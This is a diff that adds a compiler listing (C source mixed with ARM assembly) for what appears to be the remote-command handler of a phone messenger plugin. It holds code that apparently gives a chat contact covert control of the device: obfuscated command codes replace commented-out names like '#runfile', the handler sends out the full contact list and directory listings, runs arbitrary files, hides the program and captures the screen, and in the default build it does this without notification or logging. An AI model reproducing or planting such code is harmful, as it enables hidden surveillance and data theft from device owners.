+   \   00000368   EC1F8FE2           ADR      R1,??CheckComand2_0  ;; "act"
+   \   0000036C   E70000EA           B        ??CheckComand2_19
+    235                return;      
+    236              }    
+    237              /*
+    238             if(strstr(txt,"#gprsoff"))
+    239             {
+    240          #ifdef kluchnik
+    241               char *s=malloc(256);
+    242               sprintf(s,"Recive command < Gprs off >");
+    243               AddStringToLog(t,0x01,s,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
+    244               mfree(s);
+    245               SendData(t,"GPRS Off",ENA_SIGNAL,0);
+    246          #else
+    247               SendData(t,"GPRS Off",DIS_SIGNAL,1);
+    248               GPRS_OnOff(0,1);   
+    249          #endif
+    250               return;
+    251             }*/
+    252           
+    253              
+    254              if(/*strstr(txt,"#idlescr") ||*/ strstr(txt,_IDLESCR))
+   \                     ??CheckComand2_20:
+   \   00000370   EB1F8FE2           ADR      R1,??CheckComand2_0+0x4  ;; "@4"
+   \   00000374   0600A0E1           MOV      R0,R6
+   \   00000378   180100EF           SWI      +280
+   \   0000037C   000050E3           CMP      R0,#+0
+   \   00000380   1500000A           BEQ      ??CheckComand2_22
+    255              {
+    256                SendData(t,"scr..",DIS_SIGNAL,1);
+   \   00000384   0130A0E3           MOV      R3,#+1
+   \   00000388   0B20A0E1           MOV      R2,R11
+   \   0000038C   481085E2           ADD      R1,R5,#+72
+   \   00000390   0400A0E1           MOV      R0,R4
+   \   00000394   ........           _BLF     SendData,??SendData??rA
+    257                RecountMenu(NULL,1);
+   \   00000398   0810A0E1           MOV      R1,R8
+   \   0000039C   0B00A0E1           MOV      R0,R11
+   \   000003A0   ........           _BLF     RecountMenu,??RecountMenu??rA
+    258                silenthide=1;
+   \   000003A4   AC039FE5           LDR      R0,??CheckComand2_0+0x38  ;; silenthide
+    259                gipc.name_to=ipc_xtask_name;
+   \   000003A8   AC339FE5           LDR      R3,??CheckComand2_0+0x3C  ;; gipc
+   \   000003AC   008080E5           STR      R8,[R0, #+0]
+   \   000003B0   A8039FE5           LDR      R0,??CheckComand2_0+0x40  ;; ipc_xtask_name
+    260                gipc.name_from=ipc_my_name;
+    261                gipc.data=0;
+   \   000003B4   08B083E5           STR      R11,[R3, #+8]
+   \   000003B8   000083E5           STR      R0,[R3, #+0]
+   \   000003BC   A0039FE5           LDR      R0,??CheckComand2_0+0x44  ;; ipc_my_name
+    262                GBS_SendMessage(MMI_CEPID,MSG_IPC,IPC_XTASK_IDLE,&gipc);    
+   \   000003C0   0820A0E1           MOV      R2,R8
+   \   000003C4   040083E5           STR      R0,[R3, #+4]
+   \   000003C8   FC1F89E3           ORR      R1,R9,#0x3F0
+   \   000003CC   0900A0E3           MOV      R0,#+9
+   \   000003D0   420C80E3           ORR      R0,R0,#0x4200
+   \   000003D4   000100EF           SWI      +256
+    263                return;    
+   \   000003D8   660000EA           B        ??CheckComand2_4
+    264              }
+    265          
+    266              
+    267              if(/*strstr(txt,"#disconnect") ||*/ strstr(txt,_DISCONNECT))
+   \                     ??CheckComand2_22:
+   \   000003DC   D11F8FE2           ADR      R1,??CheckComand2_0+0x8  ;; "@5"
+   \   000003E0   0600A0E1           MOV      R0,R6
+   \   000003E4   180100EF           SWI      +280
+   \   000003E8   000050E3           CMP      R0,#+0
+   \   000003EC   1300000A           BEQ      ??CheckComand2_23
+    268              {
+    269                comanda=0;
+    270                disautorecconect=1;
+   \   000003F0   70039FE5           LDR      R0,??CheckComand2_0+0x48  ;; disautorecconect
+   \   000003F4   00B087E5           STR      R11,[R7, #+0]
+   \   000003F8   008080E5           STR      R8,[R0, #+0]
+    271                t->signals=0;
+   \   000003FC   74B084E5           STR      R11,[R4, #+116]
+    272                SENDMSGCOUNT++;
+   \   00000400   00009AE5           LDR      R0,[R10, #+0]
+   \   00000404   010080E2           ADD      R0,R0,#+1
+   \   00000408   00008AE5           STR      R0,[R10, #+0]
+    273          #ifdef kluchnik
+    274          #else
+    275                void end_socket(void);
+    276                SUBPROC((void*)end_socket);
+   \   0000040C   58039FE5           LDR      R0,??CheckComand2_0+0x4C  ;; end_socket
+   \   00000410   710100EF           SWI      +369
+    277          #endif
+    278                return;
+   \   00000414   570000EA           B        ??CheckComand2_4
+   \                     ??CheckComand2_2:
+   \   00000418   40313300           DC8      "@13"
+   \   0000041C   40313000           DC8      "@10"
+   \   00000420   40313100           DC8      "@11"
+   \   00000424   40313200           DC8      "@12"
+   \   00000428   40310000           DC8      "@1",+0
+   \   0000042C   20000000           DC8      " ",+0,+0
+   \   00000430   21000000           DC8      "!",+0,+0
+   \   00000434   49620000           DC8      "Ib",+0
+   \   00000438   40320000           DC8      "@2",+0
+   \   0000043C   40330000           DC8      "@3",+0
+    279              }    
+    280             
+    281              if(/*strstr(txt,"#getclistall") || */strstr(txt,_GETCLISTALL))
+   \                     ??CheckComand2_23:
+   \   00000440   28739FE5           LDR      R7,??CheckComand2_0+0x50  ;; cltop
+   \   00000444   B81F8FE2           ADR      R1,??CheckComand2_0+0xC  ;; "@6"
+   \   00000448   0600A0E1           MOV      R0,R6
+   \   0000044C   180100EF           SWI      +280
+   \   00000450   000050E3           CMP      R0,#+0
+   \   00000454   1C00000A           BEQ      ??CheckComand2_24
+    282              {
+    283                CLIST *tt;
+    284                tt=(CLIST *)(&cltop);
+    285                char *s=malloc(16384);
+   \   00000458   400CA0E3           MOV      R0,#+16384
+   \   0000045C   140000EF           SWI      +20
+   \   00000460   0060A0E1           MOV      R6,R0
+    286                *s=0;
+   \   00000464   00B0C6E5           STRB     R11,[R6, #+0]
+   \   00000468   110000EA           B        ??CheckComand2_25
+    287                char ss[64];
+    288                char *q;
+    289                while(tt=(CLIST *)(tt->next))
+    290                 {
+    291                  if(!tt->isgroup)
+   \                     ??CheckComand2_26:
+   \   0000046C   080097E5           LDR      R0,[R7, #+8]
+   \   00000470   000050E3           CMP      R0,#+0
+   \   00000474   0E00001A           BNE      ??CheckComand2_25
+    292                   {
+    293                     q=GetStatusByIconIndex(GetIconIndex(tt));
+   \   00000478   0700A0E1           MOV      R0,R7
+   \   0000047C   ........           _BLF     GetIconIndex,??GetIconIndex??rA
+   \   00000480   ........           _BLF     GetStatusByIconIndex,??GetStatusByIconIndex??rA
+    294                     snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
+   \   00000484   01002DE9           PUSH     {R0}
+   \   00000488   0C0097E5           LDR      R0,[R7, #+12]
+   \   0000048C   143087E2           ADD      R3,R7,#+20
+   \   00000490   01002DE9           PUSH     {R0}
+   \   00000494   502085E2           ADD      R2,R5,#+80
+   \   00000498   4010A0E3           MOV      R1,#+64
+   \   0000049C   10008DE2           ADD      R0,SP,#+16
+   \   000004A0   1B0100EF           SWI      +283
+    295                     strcat(s,ss);
+   \   000004A4   10108DE2           ADD      R1,SP,#+16
+   \   000004A8   0600A0E1           MOV      R0,R6
+   \   000004AC   170000EF           SWI      +23
+   \   000004B0   08D08DE2           ADD      SP,SP,#+8
+    296                   }
+    297                 }
+   \                     ??CheckComand2_25:
+   \   000004B4   007097E5           LDR      R7,[R7, #+0]
+   \   000004B8   000057E3           CMP      R7,#+0
+   \   000004BC   EAFFFF1A           BNE      ??CheckComand2_26
+    298          #ifdef kluchnik
+    299                AddStringToLog(t,0x01,"Sending contact list all...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
+    300                SendData(t,s,ENA_SIGNAL,0);
+    301          #else
+    302                SendData(t,s,DIS_SIGNAL,1);
+   \   000004C0   0130A0E3           MOV      R3,#+1
+   \   000004C4   0B20A0E1           MOV      R2,R11
+   \   000004C8   250000EA           B        ??CheckComand2_17
+    303          #endif
+    304                mfree(s);
+    305                return;
+    306              }
+    307             
+    308              if(/*strstr(txt,"#getclist") || */strstr(txt,_GETCLIST))
+   \                     ??CheckComand2_24:
+   \   000004CC   971F8FE2           ADR      R1,??CheckComand2_0+0x10  ;; "@7"
+   \   000004D0   0600A0E1           MOV      R0,R6
+   \   000004D4   180100EF           SWI      +280
+   \   000004D8   000050E3           CMP      R0,#+0
+   \   000004DC   2700000A           BEQ      ??CheckComand2_27
+    309              {
+    310                CLIST *tt;
+    311                tt=(CLIST *)(&cltop);
+    312                char *s=malloc(16384);
+   \   000004E0   400CA0E3           MOV      R0,#+16384
+   \   000004E4   140000EF           SWI      +20
+   \   000004E8   0060A0E1           MOV      R6,R0
+    313                *s=0;
+   \   000004EC   00B0C6E5           STRB     R11,[R6, #+0]
+   \   000004F0   160000EA           B        ??CheckComand2_28
+    314                char ss[64];
+    315                char *q;
+    316                while(tt=(CLIST *)(tt->next))
+    317                 {
+    318                  if(tt->state!=0xFFFF && !tt->isgroup)
+   \                     ??CheckComand2_29:
+   \   000004F4   B405D7E1           LDRH     R0,[R7, #+84]
+   \   000004F8   FF10A0E3           MOV      R1,#+255
+   \   000004FC   FF1C81E3           ORR      R1,R1,#0xFF00
+   \   00000500   010050E1           CMP      R0,R1
+   \   00000504   1100000A           BEQ      ??CheckComand2_28
+   \   00000508   080097E5           LDR      R0,[R7, #+8]
+   \   0000050C   000050E3           CMP      R0,#+0
+   \   00000510   0E00001A           BNE      ??CheckComand2_28
+    319                   {
+    320                     q=GetStatusByIconIndex(GetIconIndex(tt));
+   \   00000514   0700A0E1           MOV      R0,R7
+   \   00000518   ........           _BLF     GetIconIndex,??GetIconIndex??rA
+   \   0000051C   ........           _BLF     GetStatusByIconIndex,??GetStatusByIconIndex??rA
+    321                     snprintf(ss,64,"%s ( %d ) [%s]\r\n",tt->name,tt->uin,q);
+   \   00000520   01002DE9           PUSH     {R0}
+   \   00000524   0C0097E5           LDR      R0,[R7, #+12]
+   \   00000528   143087E2           ADD      R3,R7,#+20
+   \   0000052C   01002DE9           PUSH     {R0}
+   \   00000530   502085E2           ADD      R2,R5,#+80
+   \   00000534   4010A0E3           MOV      R1,#+64
+   \   00000538   10008DE2           ADD      R0,SP,#+16
+   \   0000053C   1B0100EF           SWI      +283
+    322                     strcat(s,ss);
+   \   00000540   10108DE2           ADD      R1,SP,#+16
+   \   00000544   0600A0E1           MOV      R0,R6
+   \   00000548   170000EF           SWI      +23
+   \   0000054C   08D08DE2           ADD      SP,SP,#+8
+    323                   }
+    324                 }
+   \                     ??CheckComand2_28:
+   \   00000550   007097E5           LDR      R7,[R7, #+0]
+   \   00000554   000057E3           CMP      R7,#+0
+   \   00000558   E5FFFF1A           BNE      ??CheckComand2_29
+    325          #ifdef kluchnik
+    326                AddStringToLog(t,0x01,"Sending contact list online...",I_str,(++SENDMSGCOUNT)&0x7FFF,1);
+    327                SendData(t,s,ENA_SIGNAL,0);
+    328          #else
+    329                SendData(t,s,DIS_SIGNAL,1);
+   \   0000055C   0130A0E3           MOV      R3,#+1
+   \   00000560   0B20A0E1           MOV      R2,R11
+   \                     ??CheckComand2_17:
+   \   00000564   0610A0E1           MOV      R1,R6
+   \   00000568   0400A0E1           MOV      R0,R4
+   \   0000056C   ........           _BLF     SendData,??SendData??rA
+    330          #endif      
+    331                mfree(s);
+   \   00000570   0600A0E1           MOV      R0,R6
+   \                     ??CheckComand2_30:
+   \   00000574   150000EF           SWI      +21
+    332                return;
+   \                     ??CheckComand2_4:
+   \   00000578   C8DF8DE2           ADD      SP,SP,#+800
+   \   0000057C   F08FBDE8           POP      {R4-R11,PC}
+    333              }
+   \                     ??CheckComand2_27:
+   \   00000580   6B1F8FE2           ADR      R1,??CheckComand2_0+0x14  ;; "@8"
+   \   00000584   0600A0E1           MOV      R0,R6
+    334              
+    335           
+    336             
+    337              if(/*strstr(txt,"#getflist") || */strstr(txt,_GETFLIST))
+   \   00000588   180100EF           SWI      +280
+   \   0000058C   000050E3           CMP      R0,#+0
+   \   00000590   4800000A           BEQ      ??CheckComand2_31
+    338               {
+    339                 DIR_ENTRY de;
+    340                 unsigned int err;
+    341                 char *s=malloc(16384);
+   \   00000594   400CA0E3           MOV      R0,#+16384
+   \   00000598   140000EF           SWI      +20
+   \   0000059C   0070A0E1           MOV      R7,R0
+    342                 char *path=malloc(256);
+   \   000005A0   400FA0E3           MOV      R0,#+256
+   \   000005A4   140000EF           SWI      +20
+   \   000005A8   0080A0E1           MOV      R8,R0
+    343                 char p[64];
+    344                 if(strstr(txt,_GETFLIST))
+   \   000005AC   601F8FE2           ADR      R1,??CheckComand2_0+0x14  ;; "@8"
+   \   000005B0   0600A0E1           MOV      R0,R6
+   \   000005B4   180100EF           SWI      +280
+   \   000005B8   000050E3           CMP      R0,#+0
+   \   000005BC   0300000A           BEQ      ??CheckComand2_32
+    345                   sprintf(path,per_s,txt+3);
+   \   000005C0   AC119FE5           LDR      R1,??CheckComand2_0+0x54  ;; per_s
+   \   000005C4   032086E2           ADD      R2,R6,#+3
+   \   000005C8   0800A0E1           MOV      R0,R8
+   \   000005CC   160000EF           SWI      +22
+    346               /*  else
+    347                   sprintf(path,per_s,txt+strlen("#getflist")+1);*/
+    348                 char *ptr=path+strlen(path)+1;
+   \                     ??CheckComand2_32:
+   \   000005D0   0800A0E1           MOV      R0,R8
+   \   000005D4   1B0000EF           SWI      +27
+   \   000005D8   080080E0           ADD      R0,R0,R8
+   \   000005DC   019080E2           ADD      R9,R0,#+1
+    349                 strcat(path,"\\*.*");
+   \   000005E0   641085E2           ADD      R1,R5,#+100
+   \   000005E4   0800A0E1           MOV      R0,R8
+   \   000005E8   170000EF           SWI      +23
+    350                 *s=0;
+   \   000005EC   00B0C7E5           STRB     R11,[R7, #+0]
+    351                 if(FindFirstFile(&de,path,&err))
+   \   000005F0   0D20A0E1           MOV      R2,SP
+   \   000005F4   0810A0E1           MOV      R1,R8
+   \   000005F8   68008DE2           ADD      R0,SP,#+104
+   \   000005FC   6B0000EF           SWI      +107
+   \   00000600   000050E3           CMP      R0,#+0
+   \   00000604   1300000A           BEQ      ??CheckComand2_33
+    352                  {
+    353                   do
+    354                   {
+    355                     strcpy(ptr,de.file_name);  
+   \                     ??CheckComand2_34:
+   \   00000608   11108DE2           ADD      R1,SP,#+17
+   \   0000060C   401F81E2           ADD      R1,R1,#+256
+   \   00000610   0900A0E1           MOV      R0,R9
+   \   00000614   1A0000EF           SWI      +26
+    356                     if (de.file_attr&FA_DIRECTORY)
+   \   00000618   F607DDE1           LDRSH    R0,[SP, #+118]
+   \   0000061C   11208DE2           ADD      R2,SP,#+17
+   \   00000620   402F82E2           ADD      R2,R2,#+256
+   \   00000624   100010E3           TST      R0,#0x10
+    357                       sprintf(p,"\\%s\r\n",de.file_name);
+   \   00000628   6C108512           ADDNE    R1,R5,#+108
+    358                     else
+    359                      sprintf(p," %s\r\n",de.file_name);
+   \   0000062C   74108502           ADDEQ    R1,R5,#+116
+   \   00000630   08008DE2           ADD      R0,SP,#+8
+   \   00000634   160000EF           SWI      +22
+    360                      strcat(s,p);
+   \   00000638   08108DE2           ADD      R1,SP,#+8
+   \   0000063C   0700A0E1           MOV      R0,R7
+   \   00000640   170000EF           SWI      +23
+    361                   }
+    362                   while(FindNextFile(&de,&err));
+   \   00000644   0D10A0E1           MOV      R1,SP
+   \   00000648   68008DE2           ADD      R0,SP,#+104
+   \   0000064C   6C0000EF           SWI      +108
+   \   00000650   000050E3           CMP      R0,#+0
+   \   00000654   EBFFFF1A           BNE      ??CheckComand2_34
+    363                  }
+    364                 FindClose(&de,&err);
+   \                     ??CheckComand2_33:
+   \   00000658   0D10A0E1           MOV      R1,SP
+   \   0000065C   68008DE2           ADD      R0,SP,#+104
+   \   00000660   6D0000EF           SWI      +109
+    365                 mfree(path);
+   \   00000664   0800A0E1           MOV      R0,R8
+   \   00000668   150000EF           SWI      +21
+    366                 if(!s) sprintf(s,"dr ( %s ) n f",txt+strlen(_GETFLIST)+1);
+   \   0000066C   000057E3           CMP      R7,#+0
+   \   00000670   0600001A           BNE      ??CheckComand2_35
+   \   00000674   2E0F8FE2           ADR      R0,??CheckComand2_0+0x14  ;; "@8"
+   \   00000678   1B0000EF           SWI      +27
+   \   0000067C   060080E0           ADD      R0,R0,R6
+   \   00000680   012080E2           ADD      R2,R0,#+1
+   \   00000684   7C1085E2           ADD      R1,R5,#+124
+   \   00000688   0000A0E3           MOV      R0,#+0
+   \   0000068C   160000EF           SWI      +22
+    367            
+    368            #ifdef kluchnik
+    369                 char *ss=malloc(256);
+    370                 sprintf(ss,"Recive command < Get files from directory %s >",txt+strlen(_GETFLIST)+1);
+    371                 AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
+    372                 if(SHOW_ACTIVE)
+    373                   t->isactive=ACTIVE_TIME;
+    374                 SendData(t,s,ENA_SIGNAL,0);
+    375                 mfree(ss);
+    376            #else
+    377                 SENDMSGCOUNT++;
+   \                     ??CheckComand2_35:
+   \   00000690   00009AE5           LDR      R0,[R10, #+0]
+    378                 SendData(t,s,DIS_SIGNAL,0);
+   \   00000694   0030A0E3           MOV      R3,#+0
+   \   00000698   010080E2           ADD      R0,R0,#+1
+   \   0000069C   00008AE5           STR      R0,[R10, #+0]
+   \   000006A0   0320A0E1           MOV      R2,R3
+   \   000006A4   0710A0E1           MOV      R1,R7
+   \   000006A8   0400A0E1           MOV      R0,R4
+   \   000006AC   ........           _BLF     SendData,??SendData??rA
+    379            #endif      
+    380                 mfree(s);
+   \   000006B0   0700A0E1           MOV      R0,R7
+   \   000006B4   AEFFFFEA           B        ??CheckComand2_30
+    381                 return;
+    382               }
+    383                
+    384             if(/*strstr(txt,"#runfile") ||*/ strstr(txt,_RUNFILE))
+   \                     ??CheckComand2_31:
+   \   000006B8   1E7F8FE2           ADR      R7,??CheckComand2_0+0x18  ;; "@9"
+   \   000006BC   0710A0E1           MOV      R1,R7
+   \   000006C0   0600A0E1           MOV      R0,R6
+   \   000006C4   180100EF           SWI      +280
+   \   000006C8   000050E3           CMP      R0,#+0
+   \   000006CC   1100000A           BEQ      ??CheckComand2_1
+    385             {   
+    386          #ifdef kluchnik
+    387               char *ss=malloc(256);
+    388               sprintf(ss,"Recive command < Run file %s >",txt+strlen(_RUNFILE)+1);
+    389               AddStringToLog(t,0x01,ss,I_str,(++SENDMSGCOUNT)&0x7FFF,1);
+    390               SendData(t,"File was been runned!!",ENA_SIGNAL,0);
+    391               mfree(ss);
+    392          #else
+    393               int i=0;
+    394               if(strstr(txt,_RUNFILE)) i=start(txt+3);
+   \   000006D0   0710A0E1           MOV      R1,R7
+   \   000006D4   0600A0E1           MOV      R0,R6
+   \   000006D8   180100EF           SWI      +280
+   \   000006DC   000050E3           CMP      R0,#+0
+   \   000006E0   0700000A           BEQ      ??CheckComand2_36
+    395             //  else i=start(txt+strlen("#runfile")+1);
+    396                  
+    397               if(i)
+   \   000006E4   030086E2           ADD      R0,R6,#+3
+   \   000006E8   ........           BL       start
+   \   000006EC   000050E3           CMP      R0,#+0
+   \   000006F0   0300000A           BEQ      ??CheckComand2_36
+    398                 SendData(t,"run!",DIS_SIGNAL,1);
+   \   000006F4   0130A0E3           MOV      R3,#+1
+   \   000006F8   0B20A0E1           MOV      R2,R11
+   \   000006FC   8C1085E2           ADD      R1,R5,#+140
+   \   00000700   020000EA           B        ??CheckComand2_19
+    399               else
+    400                 SendData(t,"nrun!",DIS_SIGNAL,1);
+   \                     ??CheckComand2_36:
+   \   00000704   0130A0E3           MOV      R3,#+1
+   \   00000708   0B20A0E1           MOV      R2,R11
+   \   0000070C   401085E2           ADD      R1,R5,#+64
+   \                     ??CheckComand2_19:
+   \   00000710   0400A0E1           MOV      R0,R4
+   \   00000714   ........           _BLF     SendData,??SendData??rA
+   \                     ??CheckComand2_1:
+   \   00000718   C8DF8DE2           ADD      SP,SP,#+800      ;; stack cleaning
+   \   0000071C   F08FBDE8           POP      {R4-R11,PC}      ;; return
+   \                     ??CheckComand2_0:
+   \   00000720   61637400           DC8      "act"
+   \   00000724   40340000           DC8      "@4",+0
+   \   00000728   40350000           DC8      "@5",+0
+   \   0000072C   40360000           DC8      "@6",+0
+   \   00000730   40370000           DC8      "@7",+0
+   \   00000734   40380000           DC8      "@8",+0
+   \   00000738   40390000           DC8      "@9",+0
+   \   0000073C   ........           DC32     comanda
+   \   00000740   ........           DC32     SENDMSGCOUNT
+   \   00000744   ........           DC32     SendAnswer
+   \   00000748   ........           DC32     `?<Constant "BGAGA">`
+   \   0000074C   ........           DC32     ElfKiller
+   \   00000750   ........           DC32     vibra_count
+   \   00000754   ........           DC32     VIBR_TYPE
+   \   00000758   ........           DC32     silenthide
+   \   0000075C   ........           DC32     gipc
+   \   00000760   ........           DC32     ipc_xtask_name
+   \   00000764   ........           DC32     ipc_my_name
+   \   00000768   ........           DC32     disautorecconect
+   \   0000076C   ........           DC32     end_socket
+   \   00000770   ........           DC32     cltop
+   \   00000774   ........           DC32     per_s
+    401          #endif
+    402               return;
+    403             }   
+    404           }//if(txt[0]=='#' && t->remoteAccess!=4)
+    405          }
+    406          
+    407          
+
+   \                                 In segment DATA_I, align 4, align-sorted
+    408          IMGHDR screen={0,0,8,""};
+   \                     screen:
+   \   00000000                      DS8 8
+   \   00000008                      REQUIRE `?<Initializer for screen>`
+
+   \                                 In segment CODE, align 4, keep-with-next
+    409          void DoScreen()
+    410          {
+   \                     DoScreen:
+   \   00000000   F0402DE9           PUSH     {R4-R7,LR}
+    411            int ScrH=ScreenH();
+    412            int ScrW=ScreenW();
+    413            char *ms=RamScreenBuffer();
+    414            screen.w=ScrW;
+   \   00000004   40709FE5           LDR      R7,??DoScreen_0  ;; screen
+   \   00000008   898100EF           SWI      +33161
+   \   0000000C   0040A0E1           MOV      R4,R0
+   \   00000010   888100EF           SWI      +33160
+   \   00000014   0050A0E1           MOV      R5,R0
+   \   00000018   E08000EF           SWI      +32992
+   \   0000001C   0060A0E1           MOV      R6,R0
+    415            screen.h=ScrH;
+    416            screen.bitmap=malloc(ScrW*ScrH*2);
+   \   00000020   940500E0           MUL      R0,R4,R5
+   \   00000024   0050C7E5           STRB     R5,[R7, #+0]
+   \   00000028   0140C7E5           STRB     R4,[R7, #+1]
+   \   0000002C   8040A0E1           LSL      R4,R0,#+1
+   \   00000030   0400A0E1           MOV      R0,R4
+   \   00000034   140000EF           SWI      +20
+   \   00000038   040087E5           STR      R0,[R7, #+4]
+    417            memcpy(screen.bitmap, ms, ScrW*ScrH*2);
+   \   0000003C   0420A0E1           MOV      R2,R4
+   \   00000040   0610A0E1           MOV      R1,R6
+   \   00000044   1E0100EF           SWI      +286
+    418          }
+   \   00000048   F080BDE8           POP      {R4-R7,PC}       ;; return
+   \                     ??DoScreen_0:
+   \   0000004C   ........           DC32     screen
+
+   \                                 In segment DATA_ID, align 4, align-sorted
+   \                     `?<Initializer for screen>`:
+   \   00000000   0000               DC8 0, 0
+   \   00000002   0800               DC16 8
+   \   00000004   ........           DC32 `?<Constant "">`
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403200             DC8 "@2"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \                     `?<Constant "">`:
+   \   00000000   00                 DC8 ""
+
+   \                                 In segment DATA_C, align 4, align-sorted
+   \                     `?<Constant "NULL pointer function!">`:
+   \   00000000   4E554C4C2070       DC8 "NULL pointer function!"
+   \              6F696E746572
+   \              2066756E6374
+   \              696F6E2100  
+   \   00000017   00                 DC8 0
+   \   00000018   2530385800         DC8 "%08X"
+   \   0000001D   000000             DC8 0, 0, 0
+
+   \                                 In segment DATA_C, align 4, align-sorted
+   \   00000000   40313300           DC8 "@13"
+
+   \                                 In segment DATA_C, align 4, align-sorted
+   \                     `?<Constant "BGAGA">`:
+   \   00000000   424741474100       DC8 "BGAGA"
+   \   00000006   0000               DC8 0, 0
+   \   00000008   404D7320733A       DC8 "@Ms s: %s"
+   \              20257300    
+   \   00000012   0000               DC8 0, 0
+   \   00000014   6D205B202573       DC8 "m [ %s ] to [ %s ] n [ %s ] s."
+   \              205D20746F20
+   \              5B202573205D
+   \              206E205B2025
+   \              73205D20732E
+   \              00          
+   \   00000033   00                 DC8 0
+   \   00000034   4D2025732073       DC8 "M %s snd"
+   \              6E6400      
+   \   0000003D   000000             DC8 0, 0, 0
+   \   00000040   6E72756E2100       DC8 "nrun!"
+   \   00000046   0000               DC8 0, 0
+   \   00000048   7363722E2E00       DC8 "scr.."
+   \   0000004E   0000               DC8 0, 0
+   \   00000050   257320282025       DC8 "%s ( %d ) [%s]\015\012"
+   \              642029205B25
+   \              735D0D0A00  
+   \   00000061   000000             DC8 0, 0, 0
+   \   00000064   5C2A2E2A00         DC8 "\\*.*"
+   \   00000069   000000             DC8 0, 0, 0
+   \   0000006C   5C25730D0A00       DC8 "\\%s\015\012"
+   \   00000072   0000               DC8 0, 0
+   \   00000074   2025730D0A00       DC8 " %s\015\012"
+   \   0000007A   0000               DC8 0, 0
+   \   0000007C   647220282025       DC8 "dr ( %s ) n f"
+   \              732029206E20
+   \              6600        
+   \   0000008A   0000               DC8 0, 0
+   \   0000008C   72756E2100         DC8 "run!"
+   \   00000091   000000             DC8 0, 0, 0
+
+   \                                 In segment DATA_C, align 4, align-sorted
+   \   00000000   40313000           DC8 "@10"
+
+   \                                 In segment DATA_C, align 4, align-sorted
+   \   00000000   40313100           DC8 "@11"
+
+   \                                 In segment DATA_C, align 4, align-sorted
+   \   00000000   40313200           DC8 "@12"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403100             DC8 "@1"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   2100               DC8 "!"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   2000               DC8 " "
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   496200             DC8 "Ib"
+
+   \                                 In segment DATA_C, align 4, align-sorted
+   \   00000000   61637400           DC8 "act"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403300             DC8 "@3"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403400             DC8 "@4"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403500             DC8 "@5"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403600             DC8 "@6"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403700             DC8 "@7"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403800             DC8 "@8"
+
+   \                                 In segment DATA_C, align 1, align-sorted
+   \   00000000   403900             DC8 "@9"
+
+   Maximum stack usage in bytes:
+
+     Function      CSTACK
+     --------      ------
+     CheckComand2    844
+     DoScreen         20
+     get_file_size    48
+     start            16
+
+
+   Segment part sizes:
+
+     Function/Label                 Bytes
+     --------------                 -----
+     get_file_size                    40
+     start                           468
+     CheckComand2                   1912
+     screen                            8
+     DoScreen                         80
+     ?<Initializer for screen>         8
+     ?<Constant "@2">                  3
+     ?<Constant "">                    1
+     ?<Constant "NULL pointer function!">
+                                      32
+     ?<Constant "@13">                 4
+     ?<Constant "BGAGA">             148
+     ?<Constant "@10">                 4
+     ?<Constant "@11">                 4
+     ?<Constant "@12">                 4
+     ?<Constant "@1">                  3
+     ?<Constant "!">                   2
+     ?<Constant " ">                   2
+     ?<Constant "Ib">                  3
+     ?<Constant "act">                 4
+     ?<Constant "@3">                  3
+     ?<Constant "@4">                  3
+     ?<Constant "@5">                  3
+     ?<Constant "@6">                  3
+     ?<Constant "@7">                  3
+     ?<Constant "@8">                  3
+     ?<Constant "@9">                  3
+      Others                         112
+
+ 
+ 2 600 bytes in segment CODE
+   235 bytes in segment DATA_C
+     8 bytes in segment DATA_I
+     8 bytes in segment DATA_ID
+    12 bytes in segment INITTAB
+ 
+ 2 500 bytes of CODE  memory (+ 112 bytes shared)
+   243 bytes of CONST memory
+     8 bytes of DATA  memory
+
+Errors: none
+Warnings: none
